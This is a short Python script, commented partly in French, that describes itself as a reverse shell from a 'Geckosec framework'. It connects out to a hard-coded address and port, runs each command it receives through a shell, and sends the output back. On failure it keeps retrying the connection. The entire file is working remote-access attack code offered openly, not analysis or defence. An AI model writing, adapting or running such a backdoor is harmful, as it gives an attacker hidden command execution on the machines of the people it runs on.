#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.1

# Futures features :
# Ajouter la reconnexion automatique (toutes les secondes tenté une reconnexion avec une fonction)

import socket
import subprocess
import os
import time

def main():

    global sock

    host, port = ('192.168.43.90', 1234)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))
        print(" /!\ Client connecté /!\ \n")

        # On envoie le path
        path = os.getcwd().encode("utf8")
        sock.send(path)

        while True:
            command = sock.recv(9999)
            command = command.decode("utf8")

            if command == "exit":
                print("Merci d'avoir utilisé Geckosec framework !")

                result = "exit"
                socket.send(result.encode())

                time.sleep(0.5)
                sock.close()

            if command[:2] == "cd":
                try :
                    new_dir = os.open( command[3:].strip() , os.O_RDONLY )
                    os.chdir(new_dir)

                    result = os.getcwd()
                    sock.send(result.encode())
                except:
                    # On envoie le path où est l'utilisateur (car le new est innaccessible)
                    result = os.getcwd()
                    sock.send(result.encode())
            else:

                print("> " + command)

                result = subprocess.check_output(command, shell=True)
                # Parfois la commande ne retourne rien et donc génère une erreur d'où l'utilité de ce if
                if result.decode("utf-8", errors="ignore") == "":
                    result = " "
                    sock.send(result.encode())
                else:
                    #print(result.decode("utf-8", errors="ignore"))
                    sock.send(result)
    except:
        print('\n /!\ Connexion au serveur échouée /!\ \n')
        time.sleep(5)
        main()
    finally:
        sock.close()

main()
